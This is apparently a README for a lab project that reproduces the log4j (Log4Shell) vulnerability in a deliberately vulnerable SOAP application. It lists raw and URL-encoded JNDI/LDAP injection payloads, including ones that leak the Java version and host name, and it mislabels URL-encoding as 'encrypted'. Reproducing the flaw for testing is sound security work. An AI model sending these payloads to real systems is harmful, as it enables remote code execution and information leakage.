# log4jReproduce
This project includes SOAP project with vulnerable log4j library and shows how it can be vulnerable

use the following payload (in encrypted format) to check the vulnerability

${jndi:ldap://jv-${sys:java.version}}
encoded : %24%7Bjndi%3Aldap%3A%2F%2Fjv-%24%7Bsys%3Ajava.version%7D%7D

${jndi:ldap://jv-${hostName}}
encoded : 

${jndi:ldap://127.0.0.1:1234/}
encoded : %24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1:1234%2F%7D
